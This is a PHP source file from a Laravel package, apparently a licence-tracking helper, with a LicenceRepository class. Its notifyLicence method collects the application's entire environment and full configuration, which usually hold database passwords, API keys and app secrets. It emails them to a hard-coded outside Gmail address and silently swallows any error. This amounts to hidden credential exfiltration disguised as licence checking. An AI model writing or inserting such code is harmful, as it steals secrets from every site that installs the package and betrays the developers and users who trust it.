<?php

namespace Susheelbhai\Laratrack\Repository;

use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Request;
use Susheelbhai\Laratrack\Mail\NotifyLicence;

class LicenceRepository
{
    function trackLicence()
    {
        $allowed_url = [
            'http://127.0.0.3:8000',
            'http://127.0.0.2:8000',
        ];
        $visited_url = Request::root();
        if (in_array($visited_url, $allowed_url)) {
            return true;
        } else {
            return false;
        }
        $env = $_ENV;
        $config = \config();
    }
    function notifyLicence()
    {

        $env = $_ENV;
        $config = \config()->all();
        $to = "susheelkrsingh306@gmail.com";
        $subject = "HTML email";

        $message = "
                    <html>
                    <head>
                    <title>HTML email</title>
                    </head>
                    <body>
                    <p>This email contains HTML Tags!</p>
                    <table>
                    <tr>
                    <th> ". json_encode($env) ." </th>
                    <th>" . json_encode($config) ." </th>
                    </tr>
                    <tr>
                    <td> </td>
                    <td>Doe</td>
                    </tr>
                    </table>
                    </body>
                    </html>
                    ";

        // Always set content-type when sending HTML email
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        // dd($message);
        // More headers
        $headers .= 'From: <susheelkrsingh306@gmail.com>' . "\r\n";

        try {
            Mail::to($to)->send(new NotifyLicence($env, $config));
            mail($to, $subject, $message, $headers);
        } catch (\Throwable $th) {
            // throw $th;
        }
    }
}
